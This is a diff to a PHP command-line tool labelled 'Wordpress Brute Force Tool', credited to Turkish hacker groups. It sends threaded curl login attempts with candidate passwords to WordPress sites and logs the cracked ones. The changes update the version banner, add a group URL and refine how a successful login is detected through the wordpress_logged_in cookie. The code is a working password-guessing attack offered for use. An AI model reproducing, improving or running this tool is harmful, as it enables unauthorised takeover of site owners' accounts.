@@ -12,6 +12,8 @@ error_reporting(0);
 
 *    Janissaries.Org
 
+*	 wwww.Arsle.org
+
 */
 class threadle extends Thread{
 	
@@ -28,6 +30,7 @@ class threadle extends Thread{
 	public function run()
 	{
 		$yaz=fopen('sonuc.txt','a');
+		
 		echo chr(27) . "[1;33m[$this->id][+]$this->site-->$this->sifre\n".chr(27) . "[0m";
 		$ch = curl_init();
 		curl_setopt ($ch, CURLOPT_URL,$this->site);
@@ -47,11 +50,12 @@ class threadle extends Thread{
 		curl_setopt ($ch, CURLOPT_POSTFIELDS, $this->postdata);
 		curl_setopt ($ch, CURLOPT_POST, 1);
 		$result = curl_exec ($ch);
+		
 		curl_close($ch);
 		
 		
 		
-		if((preg_match("/wordpress_logged_in/",$result) and preg_match("/Location/",$result))!=null)
+		if((preg_match("/wordpress_logged_in/",$result) and !(preg_match("/deleted/",$result))))
 		{
 			
 			echo chr(27) . "[0;32m" . "[$this->id][+]$this->site-->Kirildi!\n" . chr(27) . "[0m";
@@ -68,7 +72,7 @@ class threadle extends Thread{
 
 
 
-print chr(27) . "[0;36m|----------Wordpress Brute Force Tool 1.0--------------|\n". chr(27) . "[0m";
+print chr(27) . "[0;36m|----------Wordpress Brute Force Tool 1.1--------------|\n". chr(27) . "[0m";
 print chr(27) . "[0;36m|      _             _                    _            |\n". chr(27) . "[0m";
 print chr(27) . "[0;36m|     | |           (_)                  (_)           |\n". chr(27) . "[0m";
 print chr(27) . "[0;36m|     | | __ _ _ __  _ ___ ___  __ _ _ __ _  ___  ___  |\n". chr(27) . "[0m";
@@ -81,7 +85,7 @@ print chr(27) . "[0;36m|            /  \\   _ __ ___| | ___                    |
 print chr(27) . "[0;36m|           / /\ \\ | '__/ __| |/ _ \\                   |\n". chr(27) . "[0m";
 print chr(27) . "[0;36m|          / ____ \\| |  \\__ \\ |  __/                   |\n". chr(27) . "[0m";
 print chr(27) . "[0;36m|         /_/    \\_\\_|  |___/_|\\___|                   |\n". chr(27) . "[0m";
-print chr(27) . "[0;36m|------------------------------------------------------|\n". chr(27) . "[0m";
+print chr(27) . "[0;36m|-----------------www.arsle.org------------------------|\n". chr(27) . "[0m";
 if(isset($argv[1]) and isset($argv[2]) and isset($argv[3]) and isset($argv[4]))
 {
 		$pool            = new Pool($argv[4]); 
